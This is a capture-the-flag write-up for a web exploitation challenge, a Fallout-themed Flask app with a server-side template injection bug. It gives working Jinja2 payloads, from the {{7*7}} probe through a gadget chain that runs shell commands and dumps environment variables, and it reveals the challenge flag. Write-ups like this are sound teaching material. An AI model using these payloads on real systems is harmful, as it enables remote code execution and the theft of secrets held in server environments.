# 1. VAULT-TEC OVERSEER TERMINAL

**Category:** Web Exploitation
**Difficulty:** Medium
**Platform:** Biterra (RiffHack CTF 2026)

## Challenge Description

> *A RobCo Termlink for Vault 101 lets residents personalize a terminal greeting. Enroll as an ordinary resident and recover the Overseer's sealed directive.*

The application provided a Fallout-themed terminal where residents could customize their greeting. The objective was to recover the Overseer's secret directive.

---

## Initial Reconnaissance

After logging in, the terminal displayed:

```text id="lspj9z"
EDIT TERMINAL GREETING
OVERSEER BROADCAST CHANNEL
SIGN OUT
```

A hint on the page stated:

```text id="jx85n7"
TIP: INSCRIPTION MACROS USE VAULT-TEC DOUBLE-BRACE SYNTAX
```

The use of `{{ }}` suggested that the application was using a template engine, likely **Jinja2**.

---

## Confirming SSTI

To determine whether user input was evaluated by the template engine, we set the greeting to:

```jinja id="yzgxvx"
{{7*7}}
```

The application returned:

```text id="0l9v1z"
49
```

Since the expression was evaluated rather than displayed literally, a **Server-Side Template Injection (SSTI)** vulnerability was confirmed.

---

## Fingerprinting the Template Engine

To identify the backend template engine, we used:

```jinja id="yw5c91"
{{7*'7'}}
```

Output:

```text id="l18frf"
7777777
```

In Python, multiplying a string repeats it, confirming that the application was using **Jinja2 running on Python**.

---

## Information Disclosure

Before attempting code execution, we checked whether Flask's configuration object was exposed:

```jinja id="kp38xv"
{{config}}
```

Output:

```text id="1hy53c"
<Config {'DEBUG': False, 'SECRET_KEY': None, ...}>
```

Although the configuration object was accessible, it did not contain anything useful.

---

## Achieving Remote Code Execution

Jinja2 exposes the `self` object, which can be used to reach Python's built-in namespace:

```text id="3fpcg5"
self
 ↓
__init__
 ↓
__globals__
 ↓
__builtins__
 ↓
__import__()
```

Using this gadget chain, we imported the `os` module and executed system commands:

```jinja id="2v7qv0"
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

Output:

```text id="v6uix7"
uid=999(ctf) gid=999(ctf) groups=999(ctf)
```

This confirmed successful **Remote Code Execution (RCE)**.

---

## Searching for the Flag

Initially, we searched for files containing "flag" or "directive":

```jinja id="5ec0u7"
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('find / -iname "*flag*" -o -iname "*directive*" 2>/dev/null').read() }}
```

However, no useful files were found.

Visiting the Overseer Broadcast Channel revealed:

```text id="x90wtr"
ACCESS DENIED. OVERSEER CLEARANCE REQUIRED.
THE SEALED DIRECTIVE NEVER LEAVES THE OVERSEER TERMINAL'S RUNTIME ENVIRONMENT.
```

This hinted that the flag might be stored in environment variables.

---

## Enumerating t Variables

We performed broader reconnaissance:

```jinja id="l2r20u"
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls -la / && echo ---- && ls -la /app 2>/dev/null && echo ---- && env').read() }}
```

Among the environment variables, we discovered:

```text id="gyd53a"
FLAG=bitctf{w4r_n3v3r_ch4ng3s_0verseer_t3rm1nal_pwn3d}
```

---


## Flag

```text id="m6uhhm"
bitctf{w4r_n3v3r_ch4ng3s_0verseer_t3rm1nal_pwn3d}
``





